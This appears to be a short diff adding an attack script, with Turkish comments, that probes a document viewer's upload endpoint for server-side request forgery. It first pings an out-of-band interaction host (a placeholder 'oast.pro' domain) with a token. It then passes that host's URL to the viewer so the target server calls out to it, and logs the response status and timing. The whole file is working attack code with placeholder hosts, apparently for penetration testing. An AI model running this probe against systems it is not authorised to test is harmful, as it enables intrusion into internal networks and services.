@@ -1,0 +1,14 @@
+let viewer = "https://target.example.com/viewerng/upload?url="
+let oast = "YOUR-OAST-HOST.oast.pro"
+let token = "r123"
+
+# 1) OAST ping (harici doğrulama)
+let warm = oast_http_ping(oast, token)
+
+# 2) Redirect zinciriyle OAST çağrısını viewer içinden tetiklemeyi dene
+let attack_url = viewer + ("http://" + oast + "/t/" + token)
+echo value="ATTACK => {{attack_url}}"
+let res = http_get(attack_url)
+echo value="viewer_status={{res.status}} elapsed={{res.elapsed_ms}}"
+
+return res.status
